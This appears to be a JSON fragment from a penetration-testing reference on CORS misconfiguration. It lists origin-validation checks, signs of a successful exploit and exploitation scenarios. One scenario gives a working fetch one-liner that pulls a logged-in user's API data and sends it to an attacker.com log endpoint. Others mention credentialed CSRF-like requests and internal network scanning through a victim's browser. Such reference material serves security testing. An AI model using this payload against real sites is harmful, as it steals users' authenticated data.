  "detection_checks": [
    {
      "test": "OPTIONS request with Origin header",
      "expected": "Access-Control-Allow-Origin header in response"
    },
    {
      "test": "Check if Origin validation is case-sensitive",
      "method": "Send 'null' vs 'Null' vs 'NULL'"
    },
    {
      "test": "Check if subdomain wildcard exists",
      "method": "Test attacker subdomain"
    },
    {
      "test": "Check if protocol is validated",
      "method": "Send HTTP to HTTPS target"
    },
    {
      "test": "Check if port is validated",
      "method": "Add :8080 to origin"
    },
    {
      "test": "Check credentials header support",
      "expected": "Access-Control-Allow-Credentials: true with specific origin"
    }
  ],
  "success_indicators": [
    "Access-Control-Allow-Origin matches attacker origin",
    "Access-Control-Allow-Credentials: true",
    "Data returned in response",
    "No CORS error in browser console"
  ],
  "exploitation_scenarios": [
    {
      "scenario": "Steal sensitive data",
      "technique": "Fetch protected data and send to attacker server",
      "example": "fetch('https://target.com/api/user').then(r=>r.json()).then(d=>fetch('https://attacker.com/log?d='+JSON.stringify(d)))"
    },
    {
      "scenario": "Perform actions on behalf of user",
      "technique": "Send authenticated requests via CORS",
      "example": "fetch with credentials for CSRF-like attacks"
    },
    {
      "scenario": "Bypass IP restriction",
      "technique": "Use victim's browser as proxy",
      "example": "Internal network scanning via victim's browser"
    }
  ]
